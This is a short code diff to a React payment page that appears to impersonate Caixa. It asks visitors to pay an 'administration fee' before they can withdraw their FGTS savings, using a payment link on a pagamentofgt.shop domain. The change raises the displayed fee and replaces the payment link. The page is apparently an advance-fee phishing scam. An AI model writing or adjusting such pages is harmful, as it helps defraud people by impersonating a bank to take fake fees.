@@ -87,11 +87,11 @@ export function PagamentoTarifa() {
                         <p className="text-lg mb-2 text-primary font-medium">Taxa de administração Caixa:</p>
                     </div>
                     {/* <p className="text-2xl mb-2 text-zinc-400">DE: R$47,89</p> */}
-                    <p className="text-4xl font-semibold text-primary">R$37,89</p>
+                    <p className="text-4xl font-semibold text-primary">R$67,89</p>
                 </div>
 
                 {/* Botão de confirmação */}
-                <a href="https://pay.pagamentofgt.shop/P5LNZ8qbbKQGaRy" className="w-full">
+                <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
                     <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
                         PAGAR TAXA E SACAR MEU FGTS
                     </button>
